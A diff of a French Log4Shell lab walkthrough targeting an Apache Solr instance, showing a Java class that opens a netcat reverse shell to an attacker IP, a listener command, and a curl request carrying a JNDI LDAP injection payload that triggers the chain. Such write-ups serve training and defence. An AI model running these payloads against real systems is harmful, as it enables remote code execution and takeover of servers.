@@ -57,7 +57,7 @@ Afin de créer un accès au serveur, on cherche simplement à créer un shell, p
 public class Exploit {
     static {
         try {
-            java.lang.Runtime.getRuntime().exec("nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999");
+            java.lang.Runtime.getRuntime().exec("nc -e /bin/bash 10.10.65.176 9999");
         } catch (Exception e) {
             e.printStackTrace();
         }
@@ -77,11 +77,20 @@ Pour cela on utilise le software Marshalsec (https://github.com/mbechler/marshal
 
 Une fois les éléments en place, il faut crér un serveur capacle de répondre avec notre charge malveillante, un simple `python3 -m http.server` fera l'affaire.
 
+Pour pouvoir récupérer le shell :
+
+`nc -lnvp 9999`
+
 Tous les éléments sont en place. 
 
 Une simple requête avec l'injection va permettre de déclencher toute la chaine d'attaque : 
 
 `curl 'http://10.10.31.65:8983/solr/admin/cores?foo=$\{jndi:ldap://10.10.65.176:1389/Exploit\}'`
+
+Une fois cela fait :
+
+![image](https://user-images.githubusercontent.com/16634117/145872643-ec39c7ca-e33d-4b34-8c31-a6b2ed397b09.png)
+_De haut en bas et de gauche à droite : la reqûete malveillante, le serveur LDAP redirigeant le traffic, le serveur Python répondant avec la payload RCE comilée, le reverse shell_
 
 
 
